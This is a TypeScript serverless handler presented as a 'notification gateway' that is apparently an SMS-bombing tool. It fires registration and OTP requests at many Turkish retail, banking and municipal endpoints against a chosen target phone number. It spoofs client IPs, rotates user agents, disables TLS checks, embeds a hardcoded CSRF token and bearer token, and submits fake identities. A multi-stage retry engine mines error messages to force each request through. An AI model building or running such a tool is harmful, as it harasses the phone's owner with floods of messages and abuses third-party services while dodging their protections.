// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

// SSL Bypass (Legacy sistem simülasyonu için)
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// ─── TYPES ──────────────────────────────────────────────────────────────────

export interface NotificationRequest {
  recipient: string;
  serviceId: string;
  email?: string;
  metadata?: Record<string, unknown>;
}

export interface NotificationResult {
  provider: string;
  success: boolean;
  error?: string;
  attempts: number;
}

// ─── STEALTH UTILITIES (IP & UA ROTATION) ────────────────────────────────────

const getRandomTurkishIP = () => {
  const blocks = [[88, 224, 255], [85, 96, 111], [176, 216, 223], [195, 174, 175], [94, 54, 55]];
  const b = blocks[Math.floor(Math.random() * blocks.length)];
  return `${b[0]}.${Math.floor(Math.random() * (b[2] - b[1])) + b[1]}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

const getRandomUA = () => {
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0'
  ];
  return uas[Math.floor(Math.random() * uas.length)];
};

// ─── CIRCUIT BREAKER ──────────────────────────────────────────────────────────

class CircuitBreaker {
  private state: "CLOSED" | "OPEN" = "CLOSED";
  private failures = 0;
  private lastFailure = 0;
  private readonly threshold = 3;
  private readonly cooldown = 30000;

  constructor(public readonly name: string) {}

  get isAllowed(): boolean {
    if (this.state === "OPEN" && Date.now() - this.lastFailure > this.cooldown) {
      this.state = "CLOSED";
      this.failures = 0;
    }
    return this.state === "CLOSED";
  }

  onSuccess() { this.failures = 0; this.state = "CLOSED"; }
  onFailure() {
    this.failures++;
    this.lastFailure = Date.now();
    if (this.failures >= this.threshold) this.state = "OPEN";
  }
}

// ─── ADAPTER PATTERN (PROVISIONING LOGIC) ─────────────────────────────────────

interface ProviderAdapter {
  readonly name: string;
  transform(req: NotificationRequest): { body: any; headers: any };
}

// Yardımcı fonksiyonlar
const generateRandomEmail = () => {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 15; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result + '@gmail.com';
};

// ─── ÇALIŞAN SERVİS ADAPTERLERİ ───────────────────────────────────────────────

class KahveDunyasiAdapter implements ProviderAdapter {
  readonly name = "kahve_dunyasi";
  transform(req: NotificationRequest) {
    return {
      body: { countryCode: "90", phoneNumber: req.recipient },
      headers: {
        "X-Client-Platform": "web",
        "X-Language-Id": "tr-TR",
        "Origin": "https://www.kahvedunyasi.com",
        "Referer": "https://www.kahvedunyasi.com/"
      }
    };
  }
}

class WmfAdapter implements ProviderAdapter {
  readonly name = "wmf";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: {
        confirm: "true",
        date_of_birth: "1990-01-01",
        email: email,
        email_allowed: "true",
        first_name: "Test",
        gender: "male",
        last_name: "User",
        password: "Test123!Test",
        phone: `0${req.recipient}`
      },
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
    };
  }
}

class EvideaAdapter implements ProviderAdapter {
  readonly name = "evidea";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    const boundary = "----WebKitFormBoundary" + Math.random().toString(36).substring(2);
    const data = `--${boundary}\r\nContent-Disposition: form-data; name="first_name"\r\n\r\nTest\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="last_name"\r\n\r\nUser\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="email"\r\n\r\n${email}\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="phone"\r\n\r\n0${req.recipient}\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="password"\r\n\r\nTest123!\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="confirm"\r\n\r\ntrue\r\n` +
      `--${boundary}--`;
    return {
      body: data,
      headers: { 
        "Content-Type": `multipart/form-data; boundary=${boundary}`,
        "X-Project-Name": "undefined",
        "X-App-Type": "akinon-mobile",
        "X-Requested-With": "XMLHttpRequest",
        "X-App-Device": "ios",
        "Referer": "https://www.evidea.com/"
      }
    };
  }
}

class DrAdapter implements ProviderAdapter {
  readonly name = "dr";
  transform(req: NotificationRequest) {
    return {
      body: { phone: req.recipient },
      headers: {
        "Content-Type": "application/json",
        "Origin": "https://www.dr.com.tr",
        "Referer": "https://www.dr.com.tr/"
      }
    };
  }
}

class FileMarketAdapter implements ProviderAdapter {
  readonly name = "file_market";
  transform(req: NotificationRequest) {
    return {
      body: { mobilePhoneNumber: `90${req.recipient}` },
      headers: { 
        "Content-Type": "application/json",
        "X-Os": "IOS",
        "X-Version": "1.7"
      }
    };
  }
}

class YappAdapter implements ProviderAdapter {
  readonly name = "yapp";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    return {
      body: {
        app_version: "1.1.2",
        code: "tr",
        device_model: "iPhone9,4",
        device_type: "I",
        device_version: "15.7.8",
        email: email,
        firstname: "Test",
        is_allow_to_communication: "1",
        language_id: "1",
        lastname: "User",
        phone_number: req.recipient,
        sms_code: ""
      },
      headers: { "Content-Type": "application/json" }
    };
  }
}

class SuisteAdapter implements ProviderAdapter {
  readonly name = "suiste";
  transform(req: NotificationRequest) {
    return {
      body: {
        action: "register",
        device_id: "2390ED28-075E-465A-96DA-DFE8F84EB330",
        full_name: "Test User",
        gsm: req.recipient,
        is_advertisement: "1",
        is_contract: "1",
        password: "Test123!"
      },
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Mobillium-Device-Brand": "Apple",
        "X-Mobillium-Os-Type": "iOS"
      }
    };
  }
}

class FatihBelediyeAdapter implements ProviderAdapter {
  readonly name = "fatih_belediye";
  transform(req: NotificationRequest) {
    const email = req.email || generateRandomEmail();
    const boundary = "----WebKitFormBoundary" + Math.random().toString(36).substring(2);
    const body = `--${boundary}\r\n` +
      `Content-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nGKrki1TGUGJ0CBwKd4n5iRulER91aTo-44_PJdfM4_nxAK7aL1f0Ho9UuqG5lya_8RVBGD-j-tNjE93pZnW8RlRyrAEi6ry6uy8SEC20OPY1\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n12345678901\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n01.01.1990\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\nTest\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\nUser\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${req.recipient}\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${email}\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Sifre"\r\n\r\nTest123!\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\nTest123!\r\n` +
      `--${boundary}\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n` +
      `--${boundary}--`;
    
    return {
      body: body,
      headers: { 
        "Content-Type": `multipart/form-data; boundary=${boundary}`,
        "Origin": "https://ebelediye.fatih.bel.tr",
        "Referer": "https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet"
      }
    };
  }
}

// FİNANS SERVİSLERİ
class BkmExpressAdapter implements ProviderAdapter {
  readonly name = "bkm_express";
  transform(req: NotificationRequest) {
    return {
      body: { phone: `90${req.recipient}` },
      headers: {
        "Content-Type": "application/json",
        "Origin": "https://www.bkmexpress.com.tr",
        "Referer": "https://www.bkmexpress.com.tr/"
      }
    };
  }
}

class ShopAndFlyAdapter implements ProviderAdapter {
  readonly name = "shopandfly";
  transform(req: NotificationRequest) {
    return {
      body: { phone: `90${req.recipient}` },
      headers: {
        "Content-Type": "application/json",
        "Origin": "https://www.shopandfly.com.tr",
        "Referer": "https://www.shopandfly.com.tr/"
      }
    };
  }
}

class TebAdapter implements ProviderAdapter {
  readonly name = "teb";
  transform(req: NotificationRequest) {
    return {
      body: { phone: `90${req.recipient}` },
      headers: {
        "Content-Type": "application/json",
        "Origin": "https://www.teb.com.tr",
        "Referer": "https://www.teb.com.tr/"
      }
    };
  }
}

// LİMİTLİ SERVİSLER
class HayatSuAdapter implements ProviderAdapter {
  readonly name = "hayat_su";
  transform(req: NotificationRequest) {
    return {
      body: { mobilePhoneNumber: req.recipient, actionType: "register" },
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM"
      }
    };
  }
}

class QumparaAdapter implements ProviderAdapter {
  readonly name = "qumpara";
  transform(req: NotificationRequest) {
    return {
      body: { msisdn: `+90${req.recipient}` },
      headers: { "Content-Type": "application/json" }
    };
  }
}

class BeefullAdapter implements ProviderAdapter {
  readonly name = "beefull";
  transform(req: NotificationRequest) {
    return {
      body: {
        phoneCode: "90",
        phoneNumber: req.recipient,
        tenant: "beefull"
      },
      headers: { "Content-Type": "application/json" }
    };
  }
}

// ─── AKILLI ALAN ADI NORMALİZASYONU & RETRY ENGİNE ──────────────────────────

/** Telefonu 5 standart formata çevir */
const phoneFormats = (p: string) => {
  const clean = p.replace(/^\+?90/, '').replace(/^0/, '');
  return [
    clean,               // 5XXXXXXXXX
    `0${clean}`,         // 05XXXXXXXXX
    `90${clean}`,        // 905XXXXXXXXX
    `+90${clean}`,       // +905XXXXXXXXX
    `0090${clean}`,      // 00905XXXXXXXXX
  ];
};

/**
 * "Evrensel Probe Body" — tüm bilinen alan adlarını içerir.
 * Çoğu API bilinmeyen alanları görmezden gelir, yalnızca kendi alanını okur.
 * Tek istek ile 90%+ API uyumluluğu sağlar.
 */
function buildUniversalBody(phone: string, email: string): Record<string, string> {
  const [raw, withZero, with90, withPlus90, with0090] = phoneFormats(phone);
  return {
    // --- TELEFON (tüm yaygın varyantlar) ---
    phone: raw,            Phone: raw,           PHONE: raw,
    phoneNumber: with90,   PhoneNumber: with90,  phone_number: raw,
    mobilePhone: raw,      MobilePhone: raw,     mobile_phone: raw,
    mobilePhoneNumber: with90, MobilePhoneNumber: with90,
    mobile: raw,           Mobile: raw,
    gsm: raw,              GSM: raw,             Gsm: raw,
    gsmNumber: raw,        gsm_number: raw,
    msisdn: withPlus90,    MSISDN: withPlus90,
    tel: raw,              Tel: raw,             telephone: raw,
    cellphone: raw,        cell_phone: raw,
    phoneNum: raw,         phone_num: raw,
    cep: raw,              CepTelefonu: raw,     cepTelefonu: raw,
    countryCode: '90',     country_code: '90',
    number: raw,           Number: raw,
    // withZero varyantı (05XX)
    gsm_no: withZero,      gsmNo: withZero,
    // --- EMAIL ---
    email,                 Email: email,         EMAIL: email,
    email_address: email,  emailAddress: email,
    mail: email,           Mail: email,
    // --- İSİM ---
    first_name: 'Test',    firstName: 'Test',    FirstName: 'Test',
    last_name: 'User',     lastName: 'User',     LastName: 'User',
    name: 'Test',          Name: 'Test',         full_name: 'Test User',
    fullName: 'Test User', ad: 'Test',           soyad: 'User',
    Ad: 'Test',            Soyad: 'User',
    // --- ŞİFRE ---
    password: 'Test123!',  Password: 'Test123!', pass: 'Test123!',
    sifre: 'Test123!',     Sifre: 'Test123!',
    // --- ORTAK EKSTRALAR ---
    confirm: 'true',       gender: 'male',       date_of_birth: '1990-01-01',
    birthday: '1990-01-01',
  };
}

type FieldKind = 'phone' | 'email' | 'first_name' | 'last_name' | 'password' | 'country_code' | 'unknown';
type PhoneFormat = 'raw' | 'zero' | '90' | '+90' | '0090';

interface LearnedHint {
  field: string;
  kind: FieldKind;
  score: number;
  phoneFormat?: PhoneFormat;
  updatedAt: number;
}

const learnedHintsByService = new Map<string, Map<string, LearnedHint>>();

function inferFieldKind(fieldName: string): FieldKind {
  const f = fieldName.toLowerCase();
  if (/country.?code|ulkekodu|alan.?kodu/.test(f)) return 'country_code';
  if (/phone|gsm|msisdn|tel|cep|mobile|number/.test(f)) return 'phone';
  if (/email|mail/.test(f)) return 'email';
  if (/first.?name|^name$|ad|isim/.test(f)) return 'first_name';
  if (/last.?name|surname|soyad/.test(f)) return 'last_name';
  if (/password|pass|sifre|şifre/.test(f)) return 'password';
  return 'unknown';
}

function inferPhoneFormat(fieldName: string): PhoneFormat {
  const f = fieldName.toLowerCase();
  if (f.includes('msisdn')) return '+90';
  if (f.includes('country')) return '90';
  if (f.includes('number') || f.includes('mobilephone')) return '90';
  if (f.includes('gsm_no') || f.includes('gsmno')) return 'zero';
  return 'raw';
}

function readPhoneByFormat(phone: string, fmt: PhoneFormat): string {
  const [raw, withZero, with90, withPlus90, with0090] = phoneFormats(phone);
  if (fmt === 'zero') return withZero;
  if (fmt === '90') return with90;
  if (fmt === '+90') return withPlus90;
  if (fmt === '0090') return with0090;
  return raw;
}

function valueForKind(kind: FieldKind, fieldName: string, phone: string, email: string, hint?: LearnedHint): string {
  if (kind === 'phone') {
    const fmt = hint?.phoneFormat || inferPhoneFormat(fieldName);
    return readPhoneByFormat(phone, fmt);
  }
  if (kind === 'email') return email;
  if (kind === 'first_name') return 'Test';
  if (kind === 'last_name') return 'User';
  if (kind === 'password') return 'Test123!';
  if (kind === 'country_code') return '90';
  return '';
}

function upsertHint(serviceId: string, field: string, kind: FieldKind) {
  if (kind === 'unknown') return;
  const key = field.toLowerCase();
  if (!learnedHintsByService.has(serviceId)) learnedHintsByService.set(serviceId, new Map());
  const store = learnedHintsByService.get(serviceId)!;
  const prev = store.get(key);
  const next: LearnedHint = {
    field,
    kind,
    score: Math.min((prev?.score || 0) + 1, 10),
    phoneFormat: kind === 'phone' ? inferPhoneFormat(field) : prev?.phoneFormat,
    updatedAt: Date.now(),
  };
  store.set(key, next);
}

function applyLearnedHints(
  serviceId: string,
  originalBody: Record<string, any>,
  phone: string,
  email: string
): Record<string, any> | null {
  const store = learnedHintsByService.get(serviceId);
  if (!store || store.size === 0) return null;

  const patched = { ...originalBody };
  const hints = Array.from(store.values()).sort((a, b) => b.score - a.score).slice(0, 12);
  for (const hint of hints) {
    patched[hint.field] = valueForKind(hint.kind, hint.field, phone, email, hint);
  }
  return patched;
}

/**
 * Hata metninden hangi alan adının eksik/yanlış olduğunu çıkar,
 * hem adapter body'ini hem de universal body'yi bu bilgiyle patchler.
 */
function inferAndPatch(
  serviceId: string,
  originalBody: Record<string, any>,
  errorText: string,
  phone: string,
  email: string
): Record<string, any> | null {
  // 1. Yanıtta açıkça geçen alan adını bul
  const fieldPatterns = [
    /['"]([\w.]+)['"]\s*(?:is\s+)?(?:required|missing|gerekli|zorunlu|bulunamad[ı|i])/i,
    /(?:required|missing|invalid)\s+(?:field|param(?:eter)?)[:\s]+['"']?([\w.]+)/i,
    /(?:The\s+)?(?:field\s+)?['"]([\w.]+)['"]\s+(?:field\s+)?(?:is\s+)?(?:not|in)?valid/i,
    /"errors"[^{]*"([\w.]+)"/i,
    /Alan[ı]?[:\s]+['"']?([\w.]+)/i,
  ];

  let detected: string | null = null;
  for (const p of fieldPatterns) {
    const m = errorText.match(p);
    if (m) { detected = m[1] || m[2]; break; }
  }

  // 2. Tespit edilen alana uygun değeri ata
  const phoneKeys = ['phone','phonenumber','phone_number','mobilephone','mobile','gsm','msisdn','tel','cellphone','cep','ceptelefonu','number','phonenum'];
  const emailKeys = ['email','mail','email_address','emailaddress'];
  const firstKeys = ['first_name','firstname','name','ad','isim'];
  const lastKeys  = ['last_name','lastname','surname','soyad'];
  const passKeys  = ['password','pass','sifre'];

  if (detected) {
    const dl = detected.toLowerCase();
    const kind = inferFieldKind(dl);
    upsertHint(serviceId, detected, kind);
    const patched = { ...originalBody };
    const [raw,, with90, withPlus90] = phoneFormats(phone);
    if (phoneKeys.includes(dl)) { patched[detected] = dl.includes('90') ? with90 : dl.includes('+') ? withPlus90 : raw; return patched; }
    if (emailKeys.includes(dl)) { patched[detected] = email; return patched; }
    if (firstKeys.includes(dl)) { patched[detected] = 'Test'; return patched; }
    if (lastKeys.includes(dl))  { patched[detected] = 'User'; return patched; }
    if (passKeys.includes(dl))  { patched[detected] = 'Test123!'; return patched; }
    if (kind !== 'unknown') {
      patched[detected] = valueForKind(kind, detected, phone, email);
      return patched;
    }
  }

  // 3. Genel tahmin: sadece telefon alanı farklı formatta olabilir
  const [raw, withZero, with90, withPlus90] = phoneFormats(phone);
  for (const [k, v] of Object.entries(originalBody)) {
    const kl = k.toLowerCase();
    if (phoneKeys.includes(kl)) {
      // Mevcut değer hangi formattaydı?
      const val = String(v);
      if (val === raw) { // 5XX → 905XX dene
        const patched = { ...originalBody }; patched[k] = with90; return patched;
      } else if (val === with90) { // 905XX → +905XX dene
        const patched = { ...originalBody }; patched[k] = withPlus90; return patched;
      } else if (val === withPlus90) { // +905XX → 05XX dene
        const patched = { ...originalBody }; patched[k] = withZero; return patched;
      }
    }
  }
  return null;
}

/**
 * Content-Type döngüsü: JSON ↔ form-urlencoded.
 * Adapter JSON ile gönderdiyse urlencoded ile dener, tersi de aynı şekilde.
 */
function cycleContentType(headers: Record<string, string>): Record<string, string> {
  const ct = headers['Content-Type'] || '';
  if (ct.includes('application/json')) {
    return { ...headers, 'Content-Type': 'application/x-www-form-urlencoded' };
  } else if (ct.includes('x-www-form-urlencoded')) {
    return { ...headers, 'Content-Type': 'application/json' };
  }
  return { ...headers, 'Content-Type': 'application/json' };
}

/** Belirli bir body'i hedef Content-Type'a göre serialize eder */
function serializeBody(body: any, headers: Record<string, string>): { fetchBody: string; contentType: string } {
  const ct = headers['Content-Type'] || 'application/json';
  if (ct.includes('multipart/form-data')) {
    return { fetchBody: body, contentType: ct };
  } else if (ct.includes('x-www-form-urlencoded')) {
    return { fetchBody: new URLSearchParams(body).toString(), contentType: 'application/x-www-form-urlencoded' };
  } else {
    return { fetchBody: JSON.stringify(body), contentType: 'application/json' };
  }
}

// ─── AKILLI BAŞARI TESPİTİ ────────────────────────────────────────────────────
/**
 * HTTP status + response body üzerinde çok katmanlı başarı tespiti yapar.
 * Herhangi bir katman "başarılı" dönerse true kabul edilir.
 */
function detectSuccess(httpStatus: number, data: any, rawText: string): boolean {
  // Katman 1: HTTP durum kodu — 2xx veya 3xx
  if (httpStatus >= 200 && httpStatus < 400) return true;

  // Katman 2: Veri yoksa HTTP durumuna güven
  if (data == null) return false;

  // Katman 3: Tüm objeyi özyinelemeli tara
  if (typeof data === 'object') {
    if (deepScan(data)) return true;
  }

  // Katman 4: Ham metni kontrol et (HTML veya sade string yanıtlar)
  if (rawText) {
    const lc = rawText.toLowerCase();
    // Açık hata işaretleri varsa başarısız say
    const failWords = ['hata', 'error', 'fail', 'invalid', 'denied', 'unauthorized', 'forbidden', 'exception', 'timeout', 'not found'];
    const successWords = ['success', 'başarı', 'gönderildi', 'sent', 'verified', 'sms', 'otp', 'onay', 'tamam', 'ok', 'done', 'accepted'];
    const hasFail = failWords.some(w => lc.includes(w));
    const hasSuccess = successWords.some(w => lc.includes(w));
    if (hasSuccess && !hasFail) return true;
  }

  return false;
}

/**
 * JSON objesini özyinelemeli olarak tüm alan adları ve değerler üzerinde tarar.
 * Hangi alan adı gelirse gelsin başarı sinyali yakalanır.
 */
function deepScan(obj: any, depth = 0): boolean {
  if (depth > 5) return false; // Sonsuz döngü koruması

  // Değer bazlı kontroller
  const successValues = new Set([
    true, 1, '1', 'true', 'ok', 'OK', 'success', 'SUCCESS', 'Success',
    'sent', 'SENT', 'verified', 'VERIFIED', 'done', 'DONE',
    'accepted', 'ACCEPTED', 'completed', 'COMPLETED',
    'common.success', 'SMS sended succesfully!', 'Başarılı', 'başarılı',
    0 // bazı API'lar 0'ı başarı olarak döner (status: 0)
  ]);
  const successKeywords = [
    'success', 'başarı', 'tamam', 'gönderildi', 'gonderildi',
    'sent', 'verified', 'accepted', 'completed', 'done', 'ok'
  ];
  const failKeywords = [
    'error', 'hata', 'fail', 'false', 'denied', 'invalid',
    'unauthorized', 'forbidden', 'exception', 'not found'
  ];
  const successKeys = [
    'success', 'isSuccess', 'successful', 'ok', 'OK', 'Success',
    'Durum', 'durum', 'result', 'Result', 'status', 'Status',
    'processStatus', 'responseType', 'Control', 'control',
    'code', 'Code', 'isError', 'IsError', 'reachable'
  ];

  for (const key of Object.keys(obj)) {
    const val = obj[key];
    const keyLC = key.toLowerCase();

    // Alan adı başarı anahtarı mı?
    if (successKeys.includes(key)) {
      if (successValues.has(val)) return true;
      // isError gibi ters mantıklı alanlar
      if ((keyLC === 'iserror' || keyLC === 'haserror') && val === false) return true;
    }

    // Alan adında başarı kelimesi geçiyor mu?
    if (successKeywords.some(kw => keyLC.includes(kw))) {
      if (val === true || val === 1 || val === '1' || val === 'true') return true;
      if (typeof val === 'string' && successKeywords.some(kw => val.toLowerCase().includes(kw))) return true;
    }

    // String değer başarı kelimesi içeriyor mu?
    if (typeof val === 'string') {
      const valLC = val.toLowerCase();
      const hasSuccess = successKeywords.some(kw => valLC.includes(kw));
      const hasFail = failKeywords.some(kw => valLC.includes(kw));
      if (hasSuccess && !hasFail) return true;
    }

    // İç içe obje/dizi ise özyinelemeli tara
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        for (const item of val) {
          if (item && typeof item === 'object' && deepScan(item, depth + 1)) return true;
        }
      } else {
        if (deepScan(val, depth + 1)) return true;
      }
    }
  }

  return false;
}

// ─── ADAPTER REGISTRY ─────────────────────────────────────────────────────────

const adapters: Record<string, ProviderAdapter> = {
  kahve_dunyasi: new KahveDunyasiAdapter(),
  wmf: new WmfAdapter(),
  evidea: new EvideaAdapter(),
  dr: new DrAdapter(),
  file_market: new FileMarketAdapter(),
  yapp: new YappAdapter(),
  suiste: new SuisteAdapter(),
  fatih_belediye: new FatihBelediyeAdapter(),
  bkm_express: new BkmExpressAdapter(),
  shopandfly: new ShopAndFlyAdapter(),
  teb: new TebAdapter(),
  hayat_su: new HayatSuAdapter(),
  qumpara: new QumparaAdapter(),
  beefull: new BeefullAdapter(),
  // Default adapter
  default: {
    name: "default",
    transform: (r) => ({ body: { phone: r.recipient }, headers: {} })
  }
};

const breakers = new Map<string, CircuitBreaker>();

// ─── GATEWAY HANDLER ──────────────────────────────────────────────────────────

export default async function handler(req: VercelRequest, res: VercelResponse) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    const { serviceId, serviceUrl, targetPhone } = body;

    if (!serviceId || !serviceUrl || !targetPhone) {
      return res.status(400).json({
        ok: false,
        error: "Missing required fields: serviceId, serviceUrl, targetPhone"
      });
    }

    // Circuit Breaker Kontrolü
    if (!breakers.has(serviceId)) breakers.set(serviceId, new CircuitBreaker(serviceId));
    const breaker = breakers.get(serviceId)!;

    if (!breaker.isAllowed) {
      return res.status(200).json({ ok: false, error: "Circuit OPEN (Cooldown)" });
    }

    // Adapter Dönüşümü
    const adapter = adapters[serviceId] || adapters.default;
    const { body: payload, headers: extraHeaders } = adapter.transform({
      recipient: targetPhone,
      serviceId,
      email: body.email
    });

    // ─── 5 AŞAMALI AKILLI RETRY MOTORU ──────────────────────────────────────
    const fakeIP  = getRandomTurkishIP();
    const userAgent = getRandomUA();
    const reqEmail = body.email || generateRandomEmail();

    const doFetch = async (requestBody: any, headers: Record<string, string>) => {
      const { fetchBody, contentType } = serializeBody(requestBody, headers);
      const origin = (() => { try { return new URL(serviceUrl).origin; } catch { return serviceUrl; } })();
      return fetch(serviceUrl, {
        method: 'POST',
        headers: {
          'Content-Type': contentType,
          'User-Agent': userAgent,
          'X-Forwarded-For': fakeIP,
          'X-Real-IP': fakeIP,
          'Origin': origin,
          'Referer': origin + '/',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
          'Accept-Encoding': 'gzip, deflate, br',
          'DNT': '1', 'Connection': 'keep-alive',
          ...headers,
        },
        body: fetchBody,
      });
    };

    const readResponse = async (r: Response) => {
      const t = await r.text();
      let d: any;
      try { d = JSON.parse(t); } catch { d = { raw: t.substring(0, 500) }; }
      return { t, d };
    };

    // ── AŞAMA 1: Adapter'ın kendi body'i ──────────────────────────────────
    let resp = await doFetch(payload, extraHeaders);
    let { t: rText, d: rData } = await readResponse(resp);
    let ok = detectSuccess(resp.status, rData, rText);

    // ── AŞAMA 2: Content-Type döngüsü (JSON ↔ urlencoded) ─────────────────
    if (!ok && !resp.status.toString().startsWith('5')) {
      const altHeaders = cycleContentType(extraHeaders);
      const r2 = await doFetch(payload, altHeaders);
      const { t: t2, d: d2 } = await readResponse(r2);
      if (detectSuccess(r2.status, d2, t2)) { resp = r2; rText = t2; rData = d2; ok = true; }
    }

    // ── AŞAMA 3: Servis bazlı öğrenilen alanları önce uygula ──────────────
    if (!ok) {
      const learnedPatched = applyLearnedHints(serviceId, payload, targetPhone, reqEmail);
      if (learnedPatched) {
        const r3a = await doFetch(learnedPatched, extraHeaders);
        const { t: t3a, d: d3a } = await readResponse(r3a);
        if (detectSuccess(r3a.status, d3a, t3a)) { resp = r3a; rText = t3a; rData = d3a; ok = true; }
        if (!ok) {
          const r3ab = await doFetch(learnedPatched, cycleContentType(extraHeaders));
          const { t: t3ab, d: d3ab } = await readResponse(r3ab);
          if (detectSuccess(r3ab.status, d3ab, t3ab)) { resp = r3ab; rText = t3ab; rData = d3ab; ok = true; }
        }
      }
    }

    // ── AŞAMA 4: Hata metninden alan adı öğren, patch et ─────────────────
    if (!ok) {
      const patched = inferAndPatch(serviceId, payload, rText, targetPhone, reqEmail);
      if (patched) {
        const r3 = await doFetch(patched, extraHeaders);
        const { t: t3, d: d3 } = await readResponse(r3);
        if (detectSuccess(r3.status, d3, t3)) { resp = r3; rText = t3; rData = d3; ok = true; }
        // Content-type döngüsü de dene
        if (!ok) {
          const r3b = await doFetch(patched, cycleContentType(extraHeaders));
          const { t: t3b, d: d3b } = await readResponse(r3b);
          if (detectSuccess(r3b.status, d3b, t3b)) { resp = r3b; rText = t3b; rData = d3b; ok = true; }
        }
      }
    }

    // ── AŞAMA 5: Evrensel probe body (TÜM alan adları tek seferde) ────────
    if (!ok) {
      const universal = buildUniversalBody(targetPhone, reqEmail);
      // JSON ile dene
      const r4a = await doFetch(universal, { ...extraHeaders, 'Content-Type': 'application/json' });
      const { t: t4a, d: d4a } = await readResponse(r4a);
      if (detectSuccess(r4a.status, d4a, t4a)) { resp = r4a; rText = t4a; rData = d4a; ok = true; }
      // urlencoded ile dene
      if (!ok) {
        const r4b = await doFetch(universal, { ...extraHeaders, 'Content-Type': 'application/x-www-form-urlencoded' });
        const { t: t4b, d: d4b } = await readResponse(r4b);
        if (detectSuccess(r4b.status, d4b, t4b)) { resp = r4b; rText = t4b; rData = d4b; ok = true; }
      }
    }

    // ── AŞAMA 6: Telefon formatı döngüsü (en yaygın 8 alan × 5 format) ───
    if (!ok) {
      const topKeys = ['phone','phoneNumber','phone_number','gsm','msisdn','mobilePhoneNumber','mobile','tel'];
      const [raw, withZero, with90, withPlus90, with0090] = phoneFormats(targetPhone);
      const fmts = [raw, with90, withPlus90, withZero, with0090];
      outer: for (const key of topKeys) {
        for (const fmt of fmts) {
          const b5 = { ...payload, [key]: fmt };
          const r5 = await doFetch(b5, extraHeaders);
          const { t: t5, d: d5 } = await readResponse(r5);
          if (detectSuccess(r5.status, d5, t5)) { resp = r5; rText = t5; rData = d5; ok = true; break outer; }
        }
      }
    }

    if (ok) breaker.onSuccess(); else breaker.onFailure();


    return res.status(200).json({
      ok,
      upstreamStatus: resp.status,
      responsePreview: rText.substring(0, 200),
      responseData: rData,
    });

  } catch (error: any) {
    console.error('Proxy error:', error);
    return res.status(200).json({ ok: false, error: error.message });
  }
}
